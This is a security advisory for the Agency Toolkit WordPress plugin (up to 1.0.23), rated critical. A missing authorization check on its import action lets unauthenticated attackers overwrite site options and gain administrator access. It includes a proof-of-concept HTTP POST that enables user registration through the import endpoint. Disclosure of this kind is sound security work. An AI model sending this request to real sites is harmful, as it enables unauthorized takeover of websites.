# NoCVE
Agency Toolkit <= 1.0.23 - Missing Authorization to Unauthenticated Arbitrary Options Update

# Description

The Agency Toolkit plugin for WordPress is vulnerable to unauthorized modification of data that can lead to privilege escalation due to a missing capability check on the 'agency_toolkit_import' action in all versions up to, and including, 1.0.23. This makes it possible for unauthenticated attackers to update arbitrary options on the WordPress site. This can be leveraged to update the default role for registration to administrator and enable user registration for attackers to gain administrative user access to a vulnerable site.

## Details

- **Type**: plugin
- **Slug**: agency-toolkit
- **Affected Version**: <= 1.0.23
- **CVSS Score**: 9.8
- **CVSS Rating**: Critical
- **CVSS Vector**: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
- **CVE**: N/A
- **Status**: Active

POC
---

```
POST /wp-admin/admin.php HTTP/2
Host: wp-dev.ddev.site
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryABC123
Content-Length: 485

------WebKitFormBoundaryABC123
Content-Disposition: form-data; name="agency_toolkit_import"

1
------WebKitFormBoundaryABC123
Content-Disposition: form-data; name="import_file"; filename="settings.json"
Content-Type: application/json

[
   
    {
        "option_name": "users_can_register",
        "option_value": "1"
    }
]
------WebKitFormBoundaryABC123--
```
